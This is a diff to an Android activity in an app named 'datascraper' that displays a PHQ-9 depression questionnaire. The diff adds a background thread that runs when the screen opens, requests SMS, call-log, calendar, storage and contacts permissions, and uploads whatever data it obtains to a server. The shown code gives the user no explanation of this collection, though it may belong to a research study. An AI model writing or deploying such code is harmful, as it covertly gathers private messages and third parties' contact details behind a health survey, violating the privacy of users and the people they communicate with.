@@ -1,9 +1,13 @@
 package com.example.alex.datascraper;
 
+import android.Manifest;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.support.design.widget.FloatingActionButton;
 import android.support.design.widget.Snackbar;
+import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
 import android.text.Layout;
@@ -15,6 +19,10 @@ import android.widget.ImageButton;
 import android.widget.LinearLayout;
 import android.widget.RadioButton;
 import android.widget.RadioGroup;
+import android.widget.TextView;
+import android.widget.Toast;
+
+import java.util.ArrayList;
 
 public class phqActivity extends AppCompatActivity {
 
@@ -29,6 +37,38 @@ public class phqActivity extends AppCompatActivity {
     private static View scrollView2;
     private static LinearLayout scrollChild;
     private static ImageButton butty;
+    private static TextView buttytext;
+    private static boolean buttydone = false;
+
+    private static final int ASK_MULTIPLE_PERMISSION_REQUEST_CODE = 1;
+
+    private static final String[] permissions = new String[]{
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CALENDAR,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.READ_CONTACTS,
+    };
+
+    // constants for telling which boolean in the send array pertains to which modality
+    private static final int TEXT = 0;
+    private static final int CALLS = 1;
+    private static final int CALENDAR = 2;
+    private static final int STORAGE = 3;
+    private static final int CONTACTS = 4;
+
+    // holds which modalities are waiting for permissions to be granted
+    private ArrayList<Integer> waiting = new ArrayList<Integer>();
+    // boolean array for modalities, true indicates that the modality send thread has been launched
+    private boolean[] send = {false, false, false, false, false};
+
+    // booleans for tracking send thread dispatching, true when done dispatching
+    private boolean mainDataDispatchingFinished = false; // true when done dispatching granted permissions
+    private boolean permissionsDataDispatchingFinished = false; // true when done attempting to dispatch new permissions
+
+    private static boolean dataSent = false;
+
+    modalityHabits mhabits = new modalityHabits();
 
 
     @Override
@@ -37,6 +77,17 @@ public class phqActivity extends AppCompatActivity {
         setTitle("PHQ-9 Questionnaire");
         setContentView(R.layout.activity_phq);
 
+        // send all available data in a seperate thread from the UI, as long as it hasnt already been started
+        if(!dataSent){
+            dataSent = true;
+
+            Thread t = new Thread(){
+                public void run() {
+                    sendAllAvailableData();
+                }
+            };
+            t.start();
+        }
 
         rb1 = (Button) findViewById(R.id.radioButton);
         rb2 = (Button) findViewById(R.id.radioButton2);
@@ -50,10 +101,7 @@ public class phqActivity extends AppCompatActivity {
         scrollView2 = findViewById(R.id.scrollView2);
         scrollChild = findViewById(R.id.scrollChild);
         butty = findViewById(R.id.arrowBoy);
-
-
-
-
+        buttytext = findViewById(R.id.arrowText);
 
         questions = new RadioGroup[9];
         questions[0] = (RadioGroup) findViewById(R.id.PHQ1);
@@ -87,16 +135,17 @@ public class phqActivity extends AppCompatActivity {
                     selected = (RadioButton) findViewById(checked);
                     phq += "\"Q" + i + "\":\"" + selected.getText().toString() + "\",";
                 }
-                // send PHQ answers and move to next window if all PHQ questions were answered
-                if(PHQcompleted && modalityHabits.DONE) {
+
+                if(PHQcompleted){
+                    // send PHQ answers and move to next window if all PHQ questions were answered
                     phq = phq.substring(0, phq.length() - 1);
                     phq += "}";
                     serverHook.sendToServer("phq", phq);
-
-                    startActivity(new Intent(phqActivity.this, resultsActivity.class));
+                    startActivity(new Intent(phqActivity.this, recordActivity.class));
                 }
                 else{
-                    // say something about needing to complete
+                    Toast toast=Toast.makeText(getApplicationContext(),"Please answer all questions before continuing.",Toast.LENGTH_LONG);
+                    toast.show();
                 }
 
             }
@@ -105,15 +154,177 @@ public class phqActivity extends AppCompatActivity {
         scrollView2.getViewTreeObserver().addOnScrollChangedListener(new ViewTreeObserver.OnScrollChangedListener() {
             @Override
             public void onScrollChanged() {
-                int scrollY = scrollView2.getScrollY(); // For ScrollView
-                int scrollHeight = scrollChild.getHeight();
-                int var = (scrollHeight-1100);
-                float alph = (float)(var-scrollY)/(float)var;
-
-                butty.setAlpha(alph);
+                if(!buttydone) {
+                    int scrollY = scrollView2.getScrollY(); // For ScrollView
+                    int scrollHeight = scrollChild.getHeight();
+                    int var = (scrollHeight - 1100);
+                    float alph = (float) (var - (2 * scrollY)) / (float) var;
+                    if (alph <= 0) {
+                        buttydone = true;
+                    }
+                    butty.setAlpha(alph);
+                    buttytext.setAlpha(alph);
+                }
             }
         });
 
+    }
+
+    /**
+     * Sends all data that the app can scrape to a server
+     * Ignores data that permissions were denied for
+     */
+    public void sendAllAvailableData(){
+        Context mContext = getApplicationContext();
+        serverHook.sendToServer("debug","START");
+        Log.d("MYAPP", "GO");
+
+        // list holding modalities for which the app is waiting for permissions to be granted
+        waiting = new ArrayList<Integer>();
+
+        // check if the app has permissions for each modality
+        // if yes, mark as ready to send
+        // if no, add to list of awaited permissions
+
+        if(checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
+            send[TEXT] = true;
+        }
+        else{
+            waiting.add(TEXT);
+        }
+        if(checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+            send[CALLS] = true;
+        }
+        else{
+            waiting.add(CALLS);
+        }
+        //request calendar access if access not already available
+        if(checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED){
+            send[CALENDAR] = true;
+        }
+        else{
+            waiting.add(CALENDAR);
+        }
+        //request storage access if access not already available
+        if(checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
+            send[STORAGE] = true;
+        }
+        else{
+            waiting.add(STORAGE);
+        }
+        //request contacts access if access not already available
+        if(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED){
+            send[CONTACTS] = true;
+        }
+        else{
+            waiting.add(CONTACTS);
+        }
+
+        // ask for permission for all needed data types. If the app already has any they will be ignored
+        ActivityCompat.requestPermissions(this, permissions, ASK_MULTIPLE_PERMISSION_REQUEST_CODE);
+
+        // send all data types that were marked as having permissions already
+        if(send[TEXT]){
+            mhabits.getHabit(mContext, "texts");
+        }
+        if(send[CALLS]){
+            mhabits.getHabit(mContext, "calls");
+        }
+        if(send[CALENDAR]){
+            mhabits.getHabit(mContext, "calendar");
+        }
+        if(send[STORAGE]){
+            mhabits.getHabit(mContext, "files");
+        }
+        if(send[CONTACTS]){
+            mhabits.getHabit(mContext, "contacts");
+        }
+
+        // mark the main data dispatch as done
+        mainDataDispatchingFinished = true;
+        // see if all dispatching has been finished
+        checkIfFinishedDispatching();
+
+    }
+
+    /* checks if all available modality sending threads have been dispatched
+    * this is important for detecing if the app is done sending all available data
+     */
+    private void checkIfFinishedDispatching(){
+        if(mainDataDispatchingFinished && permissionsDataDispatchingFinished){;
+            mhabits.dispatchDone(); // tell modalityHabits that the mainactivity is done dispatching
+            mainDataDispatchingFinished = false;
+            permissionsDataDispatchingFinished = false;
+        }
+    }
+
+    /*
+     For handling permission request responses
+     */
+    @Override
+    public void onRequestPermissionsResult(int requestCode,
+                                           String permissions[], int[] grantResults) {
+
+        Context mContext = getApplicationContext();
+
+        // Try to send each modality again, if permissions were not granted they will fail gracefully
+
+        if(!send[TEXT] && !permissionsDataDispatchingFinished){
+            try {
+                mhabits.getHabit(mContext, "texts");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
+            }
+
+        }
+        if(!send[CALLS] && !permissionsDataDispatchingFinished){
+            try {
+                mhabits.getHabit(mContext, "calls");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
+            }
+
+        }
+        if(!send[CALENDAR] && !permissionsDataDispatchingFinished){
+            try {
+                mhabits.getHabit(mContext, "calendar");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
+            }
+
+        }
+        if(!send[STORAGE] && !permissionsDataDispatchingFinished){
+            try {
+                mhabits.getHabit(mContext, "files");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
+            }
+        }
+        if(!send[CONTACTS] && !permissionsDataDispatchingFinished){
+            try {
+                mhabits.getHabit(mContext, "contacts");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
+            }
+
+        }
+
+        // mark permissions response dispatcher as done and check if done dispatching
+        permissionsDataDispatchingFinished = true;
+        checkIfFinishedDispatching();
+
+    }
+
+    protected void onDestroy() {
+        super.onDestroy();
+        if (isFinishing()) {
+            dataSent = false;
+        }
     }
 
 }
